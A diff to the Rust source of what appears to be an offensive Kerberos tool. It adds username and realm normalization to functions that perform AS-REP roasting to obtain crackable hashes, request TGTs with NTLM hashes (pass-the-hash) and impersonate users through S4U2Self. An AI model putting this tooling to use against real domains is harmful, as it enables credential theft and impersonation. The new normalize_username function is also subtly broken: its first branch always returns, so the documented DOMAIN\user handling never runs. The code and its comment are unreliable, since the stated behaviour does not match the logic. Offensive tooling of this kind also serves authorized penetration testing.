@@ -24,6 +24,26 @@ use tracing::{debug, info, warn};
 
 pub const KDC_PORT: u16 = 88;
 
+/// Normalize username by stripping @domain suffix if present.
+/// This prevents double-domain bugs like "user@domain.com@DOMAIN.COM".
+/// Also handles DOMAIN\user format.
+pub fn normalize_username(username: &str) -> &str {
+    // Handle UPN format: user@domain -> extract user
+    if let Some(before_at) = username.split('@').next() {
+        return before_at;
+    }
+    // Handle down-level format: DOMAIN\user -> extract user
+    if let Some((_, user)) = username.split_once('\\') {
+        return user;
+    }
+    username
+}
+
+/// Normalize realm/domain to uppercase for Kerberos
+pub fn normalize_realm(domain: &str) -> String {
+    domain.to_uppercase()
+}
+
 // Encryption type IDs
 pub const ETYPE_RC4_HMAC: i32 = 23;
 pub const ETYPE_AES128_CTS: i32 = 17;
@@ -336,11 +356,12 @@ pub async fn asrep_roast(
     domain: &str,
     username: &str,
 ) -> Result<CrackableHash> {
-    let realm = domain.to_uppercase();
-    info!("AS-REP Roasting: {username}@{realm} via {dc_ip}");
+    let realm = normalize_realm(domain);
+    let clean_username = normalize_username(username);
+    info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip}");
 
     // AS-REQ WITHOUT pre-auth (no PA-ENC-TIMESTAMP)
-    let req_body = build_as_req_body(username, &realm, &[ETYPE_RC4_HMAC]);
+    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);
 
     let as_req = AsReq {
         pvno: 5,
@@ -388,8 +409,9 @@ pub async fn request_tgt(
     secret: &str,
     use_hash: bool,
 ) -> Result<TicketGrantingData> {
-    let realm = domain.to_uppercase();
-    info!("Requesting TGT for {username}@{realm}");
+    let realm = normalize_realm(domain);
+    let clean_username = normalize_username(username);
+    info!("Requesting TGT for {clean_username}@{realm}");
 
     let (key, etype) = if use_hash {
         (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
@@ -399,7 +421,7 @@ pub async fn request_tgt(
 
     let pa_timestamp = build_pa_enc_timestamp(&key, etype)?;
     let pa_pac = build_pa_pac_request(true);
-    let req_body = build_as_req_body(username, &realm, &[etype]);
+    let req_body = build_as_req_body(clean_username, &realm, &[etype]);
 
     let as_req = AsReq {
         pvno: 5,
@@ -626,16 +648,17 @@ pub async fn s4u2self(
     impersonate_user: &str,
 ) -> Result<TicketGrantingData> {
     let realm = &tgt.client_realm;
-    info!("S4U2Self: impersonating {impersonate_user}@{realm}");
+    let clean_impersonate_user = normalize_username(impersonate_user);
+    info!("S4U2Self: impersonating {clean_impersonate_user}@{realm}");
 
     // Build PA-FOR-USER
     let pa_for_user_data = PaForUser {
         username: PrincipalName {
             name_type: NT_PRINCIPAL,
-            name_string: vec![impersonate_user.to_string()],
+            name_string: vec![clean_impersonate_user.to_string()],
         },
         userrealm: realm.to_string(),
-        cksum: build_s4u2self_checksum(impersonate_user, realm, &tgt.session_key),
+        cksum: build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key),
         auth_package: "Kerberos".to_string(),
     };
 
